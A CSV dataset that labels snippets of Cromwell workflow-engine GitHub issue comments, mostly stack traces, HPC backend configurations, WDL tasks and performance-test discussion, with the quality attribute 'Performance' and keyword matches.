quality_attribute,sentence,source,author,repo,version,id,keyword,matched_word,match_idx,wiki,url,total_similar,target_keywords,target_matched_words
Performance,"rowable: Call w.hello, Workflow 2a89a995-aa89-4172-a5e1-1054cbccd9e0: return code was (none). Full command was: ""/bin/bash"" ""-c"" ""cat cromwell-executions/w/2a89a995-aa89-4172-a5e1-1054cbccd9e0/call-hello/script | /bin/bash <&0"". Contents of cromwell-executions/w/2a89a995-aa89-4172-a5e1-1054cbccd9e0/call-hello/stderr were empty. at cromwell.engine.backend.local.LocalBackend.cromwell$engine$backend$local$LocalBackend$$runSubprocess(LocalBackend.scala:246); at cromwell.engine.backend.local.LocalBackend$$anonfun$execute$1.apply(LocalBackend.scala:144); at cromwell.engine.backend.local.LocalBackend$$anonfun$execute$1.apply(LocalBackend.scala:138); at scala.concurrent.impl.Future$PromiseCompletingRunnable.liftedTree1$1(Future.scala:24); at scala.concurrent.impl.Future$PromiseCompletingRunnable.run(Future.scala:24); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:397); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: java.nio.file.NoSuchFileException: /home/pgrosu/me/cromwell/cromwell/cromwell-executions/w/2a89a995-aa89-4172-a5e1-1054cbccd9e0/call-hello/rc; at sun.nio.fs.UnixException.translateToIOException(UnixException.java:86); at sun.nio.fs.UnixException.rethrowAsIOException(UnixException.java:102); at sun.nio.fs.UnixException.rethrowAsIOException(UnixException.java:107); at sun.nio.fs.UnixFileSystemProvider.newByteChannel(UnixFileSystemProvider.java:214); at java.nio.file.Files.newByteChannel(Files.java:361); at java.nio.file.Files.newByteChannel(Files.java:407); at java.nio.file.Files.readAllBytes(Files.java:3149); at better.files.File.loadBytes(File.scala:80); at better.files.File",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/404#issuecomment-177622887:4878,concurren,concurrent,4878,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/404#issuecomment-177622887,1,['concurren'],['concurrent']
Performance,"rrors on our HPC that occur randomly and qsub/qstat go down temporarily and result in `failed (during ExecutingWorkflowState): java.lang.RuntimeException: Unable to start job.`. I was hoping this would retry failed submissions. . This is my current config:. ```; include required(classpath(""application"")). webservice {; port = 8000; interface = 127.0.0.1; }. #call-caching {; # enabled = true; # invalidate-bad-cache-results = true; #}. system {; job-rate-control {; jobs = 20; per = 1 second; }; }. backend {; default = SGE. providers {; Local {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory"". config {; concurrent-job-limit = 10; root = ""cromwell-executions""; run-in-background = true. default-runtime-attributes {; maxRetries: 3; }. runtime-attributes = """"""; String ? docker; String ? docker_user; """""". submit = ""/bin/bash ${script}"". submit-docker = """"""; docker run \; --rm -i \; ${""--user "" + docker_user} \; --entrypoint /bin/bash \; -v ${cwd}:${docker_cwd} \; ${docker} ${script}; """""". filesystems {; local {; localization: [; ""hard-link"", ""soft-link"", ""copy""; ]; caching {; duplication-strategy: [; ""hard-link"", ""soft-link"", ""copy""; ]; hashing-strategy: ""file""; check-sibling-md5: false; }; }; }; }; }. SGE {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory"". config {; root = ""cromwell-executions""; exit-code-timeout-seconds = 600; concurrent-job-limit = 100. default-runtime-attributes {; maxRetries: 3; }. runtime-attributes = """"""; Int cpu = 1; Float ? memory_gb; String sge_queue = ""dgdcloud.q""; String ? sge_project; """""". submit = """"""; qsub \; -terse \; -V \; -b n \; -N ${job_name} \; -wd ${cwd} \; -o ${out}.qsub \; -e ${err}.qsub \; -pe smp ${cpu} \; ${""-l h_vmem="" + memory_gb / cpu + ""g""} \; ${""-l mem_free="" + memory_gb / cpu + ""g""} \; ${""-q "" + sge_queue} \; ${""-P "" + sge_project} \; ${script}; """""". kill = ""qdel ${job_id}""; check-alive = ""qstat -j ${job_id}""; job-id-regex = ""(\\d+)""; }; }; }; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2176#issuecomment-511529362:1509,concurren,concurrent-job-limit,1509,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2176#issuecomment-511529362,1,['concurren'],['concurrent-job-limit']
Performance,"run(ForkJoinWorkerThread.java:107). [2016-10-28 14:37:35,25] [warn] JesAsyncBackendJobExecutionActor [a3dd8163case_gatk_acnv_workflow.CNLoHAndSplitsCaller:6:1]: Caught exception, retrying:; java.lang.RuntimeException: Unexpected actor death!; at cromwell.backend.impl.jes.statuspolling.JesPollingActorClient$$anonfun$pollingActorClientReceive$1.applyOrElse(JesPollingActorClient.scala:33); at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:170); at akka.actor.Actor$class.aroundReceive(Actor.scala:484); at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.aroundReceive(JesAsyncBackendJobExecutionActor.scala:82); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); at akka.actor.ActorCell.invoke(ActorCell.scala:495); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); at akka.dispatch.Mailbox.run(Mailbox.scala:224); at akka.dispatch.Mailbox.exec(Mailbox.scala:234); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). [2016-10-28 14:38:11,89] [warn] 1 failures fetching JES statuses: {""domain"":""global"",""message"":""Deadline expired before operation could complete."",""reason"":""backendError""}; [2016-10-28 14:38:11,89] [warn] JesAsyncBackendJobExecutionActor [a3dd8163case_gatk_acnv_workflow.AllelicCNV:7:1]: Caught exception, retrying:; java.io.IOException: Google request failed: {; ""code"" : 504,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Deadline expired before operation could complete."",; ""reason"" : ""backendError""; } ],; ""message"" : ""Deadline expired before operation could complete."",; ""status"" : ""DEADLINE_EXCEEDED""; }; at cromwell.backend.impl.jes.statuspolling.JesPollingActorClient$$anonfun$pollingActorClientReceive$1.applyOrElse(JesPollingActorClient.scala:30); at ",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948:10616,concurren,concurrent,10616,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948,1,['concurren'],['concurrent']
Performance,"ry CallCachingEntryId(347) (Cache entry details: Some(7b292def-1477-4450-988a-e01627d61786:GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0)); > 2020-11-07 17:54:51,673 cromwell-system-akka.dispatchers.backend-dispatcher-7385 WARN - 0123c178-1d7e-4fbc-94bd-7fc147e5ccfb-BackendCacheHitCopyingActor-0123c178:GATK4_WGS_ALL_IN_ONE.CreateSequenceGroupingTSV:-1:1-5 [UUID(0123c178)GATK4_WGS_ALL_IN_ONE.CreateSequenceGroupingTSV:NA:1]: Unrecognized runtime attribute keys: preemptible; > 2020-11-07 17:54:51,674 cromwell-system-akka.dispatchers.engine-dispatcher-38 INFO - 0123c178-1d7e-4fbc-94bd-7fc147e5ccfb-EngineJobExecutionActor-GATK4_WGS_ALL_IN_ONE.CreateSequenceGroupingTSV:NA:1 [UUID(0123c178)]: Call cache hit process had 0 total hit failures before completing successfully; > 2020-11-07 17:54:51,674 cromwell-system-akka.dispatchers.engine-dispatcher-33 INFO - 0123c178-1d7e-4fbc-94bd-7fc147e5ccfb-EngineJobExecutionActor-GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1 [UUID(0123c178)]: Could not copy a suitable cache hit for 0123c178:GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1. EJEA attempted to copy 1 cache hits before failing. Of these 1 failed to copy and 0 were already blacklisted from previous attempts). Falling back to running job. As you can see, some small tasks worked but large tasks failed. > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > […](#); > On Sat, Oct 24, 2020 at 8:27 PM Luyu ***@***.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807:1794,cache,cache,1794,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807,1,['cache'],['cache']
Performance,"r} NormalizeSomaticReadCounts --input ${coverage_file} \; --targets ${padded_target_file} --panelOfNormals ${pon} --factorNormalizedOutput ${entity_id}.fnt.tsv --tangentNormalized ${entity_id}.tn.tsv \; --betaHatsOutput ${entity_id}.betaHats.tsv --preTangentNormalized ${entity_id}.preTN.tsv --help false --version false --verbosity INFO --QUIET false; }. output {; File tn_file = ""${entity_id}.tn.tsv""; File pre_tn_file = ""${entity_id}.preTN.tsv""; File betahats_file = ""${entity_id}.betaHats.tsv""; }; #runtime {; # docker: ""gatk-protected/a1""; #}; }. # Segment the tangent normalized coverage profile.; task PerformSegmentation {; String entity_id; Float seg_param_alpha; Int seg_param_nperm; String seg_param_pmethod; Int seg_param_minWidth; Int seg_param_kmax; Int seg_param_nmin; Float seg_param_eta; Float seg_param_trim; String seg_param_undoSplits; Float seg_param_undoPrune; Int seg_param_undoSD; String gatk_jar; File tn_file; Int mem. command {; java -Xmx${mem}g -jar ${gatk_jar} PerformSegmentation --targets ${tn_file} \; --output ${entity_id}.seg --log2Input true --alpha ${seg_param_alpha} --nperm ${seg_param_nperm} \; --pmethod ${seg_param_pmethod} --minWidth ${seg_param_minWidth} --kmax ${seg_param_kmax} \; --nmin ${seg_param_nmin} --eta ${seg_param_eta} --trim ${seg_param_trim} --undoSplits ${seg_param_undoSplits} \; --undoPrune ${seg_param_undoPrune} --undoSD ${seg_param_undoSD} --help false --version false \; --verbosity INFO --QUIET false; }. output {; File seg_file = ""${entity_id}.seg""; }; }. # Make calls (amp, neutral, or deleted) on each segment.; task Caller {; String entity_id; String gatk_jar; File tn_file; File seg_file; Int mem. command {; java -Xmx${mem}g -jar ${gatk_jar} CallSegments --targets ${tn_file} \; --segments ${seg_file} --output ${entity_id}.called --legacy false \; --help false --version false --verbosity INFO --QUIET false; }. output {; File called_file=""${entity_id}.called""; }; }. # Call heterozygous SNPs in the normal and then count the re",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1488#issuecomment-249696151:14631,Perform,PerformSegmentation,14631,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1488#issuecomment-249696151,1,['Perform'],['PerformSegmentation']
Performance,"s due to inputs in WDL being dependent on the outputs of other tasks, which is what makes WDL great, so this cannot (easily) be fixed. So a docker_pull command would have to be executed at task execution time. But then it is redundant. This command can be part of the submit script. . Thanks @TMiguelT for suggesting flock. Together with `singularity exec` I think it can solve this particular use case. The `SINGULARITY_CACHEDIR` environment variable needs to be set to a location on the cluster. Then the following config can work:. ```; SLURM {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; concurrent-job-limit = 200; exit-code-timeout-seconds = 120; # 4G Memory by default; runtime-attributes= """"""; Int cpu = 1; Int? memory; String? docker; Int time_minutes = 120; """"""; submit-docker = """"""; # Singularity pull image. ; if [ -z $SINGULARITY_CACHEDIR ]; ; then CACHE_DIR=$HOME/singularity/cache; else CACHE_DIR=$SINGULARITY_CACHEDIR; fi; mkdir -p $CACHE_DIR; LOCK_FILE=$CACHE_DIR/singularity_pull_flock; # flock should work as this is executed at the same node as cromwell.; flock --verbose --exclusive --timeout 900 $LOCK_FILE singularity exec --containall docker://${docker} echo ""succesfully pulled ${docker}!"". # Partition selection; PARTITION=all; MEMORY=${default=""4294967296"" memory}; if [ ${time_minutes} -lt 60 ]; then PARTITION=short; fi; if [ $MEMORY -gt 107374182400 ] ; then PARTITION=highmem ; fi. # Job submission; sbatch \; --partition=$PARTITION \; --job-name=""${job_name}"" \; --chdir=""${cwd}"" \; --time=""${time_minutes}"" \; --cpus-per-task=""${cpu}"" \; --mem=$(echo ""$MEMORY / 1024^2"" | bc) \; --output=""${out}"" \; --error=""${err}"" \; --wrap \; 'singularity exec --containall --bind /shared_cluster_dir,${cwd}:${docker_cwd} docker://${docker} sh ${script}; rc=$?; if [ ! -f ${cwd}/execution/rc ]; then; echo ""$rc"" > ${cwd}/execution/rc; fi'; """"""; kill = ""scancel ${job_id}""; kill-docker = ""scancel ${job_id}""; check-alive = ""sque",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5063#issuecomment-627379430:1189,cache,cache,1189,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5063#issuecomment-627379430,1,['cache'],['cache']
Performance,"s of a much more sawtooth-looking heap graph, indicating that objects are getting GCed a lot. The max memory used is also smaller than for the non streaming version. - Using a streaming approach allows the stream to be stopped at any point in time (say if we ran over the endpoint timeout).; Note that even without streaming data from the database, we can still build the json from the strict set of events using an fs2 stream and stop that if/when needed. Another graph where Cromwell was asked to build several large metadata jsons:. ![screen shot 2018-10-19 at 1 17 28 pm](https://user-images.githubusercontent.com/2978948/47926437-ee57eb00-de96-11e8-89b4-a7df8db9e164.png); Red is non streaming, blue is streaming. ---; The main takeaway is that when **under memory pressure** (i.e when available memory is insufficient to build the requested metadata), streaming makes a significant difference on relieving the heap usage for medium to large (> 100K) metadata. ### The less good. - Response time is not as good. The use cases above were specifically targeted towards trying to build large to very large metadata.; However when used in a more realistic scenario with lots of small sized metadata and few large ones, the overall response time is increasing significantly.; If Cromwell has sufficient memory to sustain the load then streaming does not give any real improvement.; The graph below shows memory usage with (v1s) and without streaming (v1) when Cromwell has enough memory to build all requests (in MB).; ![memory-v1-v1s](https://user-images.githubusercontent.com/2978948/48013920-818d5c80-e0f3-11e8-9f71-d4dedcbb2ba1.png). The graph below shows the average response time of the metadata endpoint with and without streaming (in ms).; ![metadata-200-v1-v1s](https://user-images.githubusercontent.com/2978948/48013852-53a81800-e0f3-11e8-9152-6c844e896b09.png). A plausible explanation of the response time increase is that the connection to the DB needs to remain open (and can't be re-us",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4124#issuecomment-435955806:2296,Response time,Response time,2296,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4124#issuecomment-435955806,1,['Response time'],['Response time']
Performance,"s, stdev = 10. https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/978/ (32 total failed workflows, 1 hr 1 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/979/ (1 total failed workflows, 55 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/984/ (2 total failed workflows, 1 hr 5 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/988/ (15 total failed workflows, 1 hr 40 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/989/ (3 total failed workflows, 50 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/997/ (1 total failed workflows, 50 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/998/ (1 total failed workflows, 50 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/999/ (1 total failed workflows, 49 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/1000/ (0 total failed workflows, 52 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/1001/ (0 total failed workflows, 51 min). **After:**. Mean = 0.5, stdev = 0.5. https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/985/ (0 total failed workflows, 53 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/986/ (0 total failed workflows, 51 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/987/ (1 total failed workflows, 51 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/990/ (1 total failed workflows, 51 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/991/ (1 total failed workflows, 50 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/Pe",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-712950526:1011,Perform,PerformanceTest-against-Alpha,1011,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-712950526,1,['Perform'],['PerformanceTest-against-Alpha']
Performance,"s.AbstractGoogleClientRequest.buildHttpRequest(AbstractGoogleClientRequest.java:399); 	at cromwell.backend.google.pipelines.v1alpha2.GenomicsFactory$$anon$1.runRequest(GenomicsFactory.scala:85); 	at cromwell.backend.google.pipelines.common.api.clients.PipelinesApiRunCreationClient.runPipeline(PipelinesApiRunCreationClient.scala:53); 	at cromwell.backend.google.pipelines.common.api.clients.PipelinesApiRunCreationClient.runPipeline$(PipelinesApiRunCreationClient.scala:48); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.runPipeline(PipelinesApiAsyncBackendJobExecutionActor.scala:92); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.$anonfun$createNewJob$19(PipelinesApiAsyncBackendJobExecutionActor.scala:572); 	at scala.concurrent.Future.$anonfun$flatMap$1(Future.scala:307); 	at scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:41); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:64); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:92); 	at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:23); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:85); 	at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:92); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:41); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:49); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); ```; And instead of terminating immediately, I keep getting the same error multiple times.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5594#issuecomment-664685629:2454,concurren,concurrent,2454,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5594#issuecomment-664685629,1,['concurren'],['concurrent']
Performance,scala.collection.AbstractTraversable.map(Traversable.scala:104) ~[cromwell.jar:0.19]; at cromwell.engine.db.slick.SlickDataAccess$$anonfun$46.apply(SlickDataAccess.scala:569) ~[cromwell.jar:0.19]; at cromwell.engine.db.slick.SlickDataAccess$$anonfun$46.apply(SlickDataAccess.scala:568) ~[cromwell.jar:0.19]; at slick.backend.DatabaseComponent$DatabaseDef$$anonfun$runInContext$1.apply(DatabaseComponent.scala:146) ~[cromwell.jar:0.19]; at slick.backend.DatabaseComponent$DatabaseDef$$anonfun$runInContext$1.apply(DatabaseComponent.scala:146) ~[cromwell.jar:0.19]; at scala.concurrent.Future$$anonfun$flatMap$1.apply(Future.scala:251) ~[cromwell.jar:0.19]; at scala.concurrent.Future$$anonfun$flatMap$1.apply(Future.scala:249) ~[cromwell.jar:0.19]; at scala.concurrent.impl.CallbackRunnable.run_aroundBody0(Promise.scala:32) ~[cromwell.jar:0.19]; at scala.concurrent.impl.CallbackRunnable$AjcClosure1.run(Promise.scala:1) ~[cromwell.jar:0.19]; at org.aspectj.runtime.reflect.JoinPointImpl.proceed(JoinPointImpl.java:149) ~[cromwell.jar:0.19]; at kamon.scala.instrumentation.FutureInstrumentation$$anonfun$aroundExecution$1.apply(FutureInstrumentation.scala:44) ~[cromwell.jar:0.19]; at kamon.trace.Tracer$.withContext(TracerModule.scala:53) ~[cromwell.jar:0.19]; at kamon.scala.instrumentation.FutureInstrumentation.aroundExecution(FutureInstrumentation.scala:43) ~[cromwell.jar:0.19]; at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:31) ~[cromwell.jar:0.19]; at scala.concurrent.impl.ExecutionContextImpl$AdaptedForkJoinTask.exec(ExecutionContextImpl.scala:121) ~[cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107) [cromwell.jar:0.19]; ```,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/738#issuecomment-215187618:5860,concurren,concurrent,5860,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/738#issuecomment-215187618,6,['concurren'],['concurrent']
Performance,ser/SingleWorkflowRunnerActor/ServiceRegistryActor/KeyValue#988818050]; at cromwell.server.CromwellRootActor$$anonfun$1.applyOrElse(CromwellRootActor.scala:81); at cromwell.server.CromwellRootActor$$anonfun$1.applyOrElse(CromwellRootActor.scala:80); at akka.actor.SupervisorStrategy.handleFailure(FaultHandling.scala:295); at akka.actor.dungeon.FaultHandling$class.handleFailure(FaultHandling.scala:263); at akka.actor.ActorCell.handleFailure(ActorCell.scala:374); at akka.actor.ActorCell.invokeAll$1(ActorCell.scala:459); at akka.actor.ActorCell.systemInvoke(ActorCell.scala:483); at akka.dispatch.Mailbox.processAllSystemMessages(Mailbox.scala:282); at akka.dispatch.Mailbox.run(Mailbox.scala:223); at akka.dispatch.Mailbox.exec(Mailbox.scala:234); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: java.lang.reflect.InvocationTargetException; at sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method); at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:62); at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45); at java.lang.reflect.Constructor.newInstance(Constructor.java:423); at akka.util.Reflect$.instantiate(Reflect.scala:65); at akka.actor.ArgsReflectConstructor.produce(IndirectActorProducer.scala:96); at akka.actor.Props.newActor(Props.scala:213); at akka.actor.ActorCell.newActor(ActorCell.scala:562); at akka.actor.ActorCell.create(ActorCell.scala:588); at akka.actor.ActorCell.invokeAll$1(ActorCell.scala:461); ... 8 more; Caused by: java.lang.ExceptionInInitializerError; at cromwell.services.SingletonServicesStore$class.$init$(ServicesStore.scala:28); at cromwell.services.keyvalue.impl.SqlKey,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1748#issuecomment-265155974:1410,concurren,concurrent,1410,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1748#issuecomment-265155974,1,['concurren'],['concurrent']
Performance,"sfs/src/main/scala/cromwell/backend/impl/sfs/config/ConfigAsyncJobExecutionActor.scala; which was tweaked since the last release in a change from @cjllanwarne (https://github.com/broadinstitute/cromwell/commit/33c58ef22b6a8edc4c1912c1416225c79d298f76#diff-39fe7186c2383fc1135f29a9c05e4e57) but I don't; grasp the scope of the change enough to know if this triggers it. In our CWL run, the jobs get submitted to the cluster and run okay based on the; work directories in `cromwell-execution` but the polling dies with:; ```; [2019-01-17 12:34:15,18] [info] DispatchedConfigAsyncJobExecutionActor [ESC[38;5;2mf2e0c573ESC[0malignment_to_rec:NA:1]: Status change from - to Running; [2019-01-17 12:34:16,27] [ESC[38;5;220mwarnESC[0m] DispatchedConfigAsyncJobExecutionActor [ESC[38;5;2mf2e0c573ESC[0malignment_to_rec:NA:1]: Fatal exception polling for status. Job will fail.; java.util.concurrent.ExecutionException: Boxed Error; at scala.concurrent.impl.Promise$.resolver(Promise.scala:83); at scala.concurrent.impl.Promise$.scala$concurrent$impl$Promise$$resolveTry(Promise.scala:75); at scala.concurrent.impl.Promise$KeptPromise$.apply(Promise.scala:402); at scala.concurrent.Promise$.fromTry(Promise.scala:138); at scala.concurrent.Future$.fromTry(Future.scala:635); at cromwell.backend.standard.StandardAsyncExecutionActor.pollStatusAsync(StandardAsyncExecutionActor.scala:691); at cromwell.backend.standard.StandardAsyncExecutionActor.pollStatusAsync$(StandardAsyncExecutionActor.scala:691); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatusAsync(ConfigAsyncJobExecutionActor.scala:211); at cromwell.backend.standard.StandardAsyncExecutionActor.poll(StandardAsyncExecutionActor.scala:983); at cromwell.backend.standard.StandardAsyncExecutionActor.poll$(StandardAsyncExecutionActor.scala:977); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.poll(ConfigAsyncJobExecutionActor.scala:211); at cromwell.backend.async.AsyncBackendJobExecutionA",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-455621345:1292,concurren,concurrent,1292,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-455621345,1,['concurren'],['concurrent']
Performance,"should almost be more like a hard; > coded binary step instead of a ""come into the environment and play around,; > the water's fine!"" It's a little bit like the ICD 10 decision to give a; > unique id to every combination of things (e.g., ""got hit on the road by a; > chicken"") instead of combinations of them, eg. (""got hit"" + ""by chicken"").; > The first is harder because you represent more things (more containers),; > but the second isn't reproducible because if you lose ""by chicken"" you've; > lost the entire workflow. Does that make sense?; > What can/should we do now?; >; > So there are two things to think about. With the current representation of; > a workflow, we would want Singularity to be OCI compliant, and I would; > propose a plan to move forward is to expect this, and contribute to; > Singularity itself with the mindset of ""I want this to plug into AWS"" or ""I; > want this to plug into Kubernetes,"" etc. The backends for HPC are going to; > be good to go with just a SLURM or SGE backend, and then commands to load; > and run/exec a Singularity container. When the time comes and Singularity; > supports services, then we can start to develop (I think) the singularity; > backend configuration for cromwell, with clean commands to get statuses,; > start and stop, and otherwise integrate into the software. You guys seem; > pretty busy, so likely your best bet would be to just wait, because the; > community is going in that direction anyway.; >; > The other representation is to rethink this. An approach that I like is to; > move away from micro managing the workflow / software, and to set; > requirements for the data. If you set standard formats (meaning everything; > from the organization of files down to the headers of a data file) on the; > data itself, then the software gets built around that. A researcher can; > have confidence that the data he is collecting will work with software; > because it's validated to the format. The developers can have confidence; > th",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-441126046:8228,load,load,8228,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-441126046,2,['load'],['load']
Performance,"size is the problem. Does the issue persist after restarting the server? I committed a change to; the develop branch a few weeks ago that does a better job of cleaning up; the copying resources. If the restart solves the problem then you may want; to build from the develop branch until the next release is sent out. Also, is the bucket containing the source file the same bucket as the; workflow bucket? If not, are they in the same region?. On Wed, Nov 11, 2020 at 4:28 AM Luyu <notifications@github.com> wrote:. > Hi,; >; > The improved multipart copying (api: CreateMultipartUpload) doesn't work; > for me. The cromwell server always checks the existence of the cached file; > before the copying finishes. In Cromwell v51 and before, some small files; > <100GB were able to be successfully cached. However, with Cromwell v53,; > even a 6GB result file got a problem of caching and has to rerun. Is there; > any way to prevent the timeout of the actor?; >; > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded,; > multipart copies to improve the size of results that may be cached. There; > are also additional improvements that have recently been merged into dev; > and should appear in the next release version (or you could build from; > source) v52+ requires a new AWS configuration. Instructions are in; > 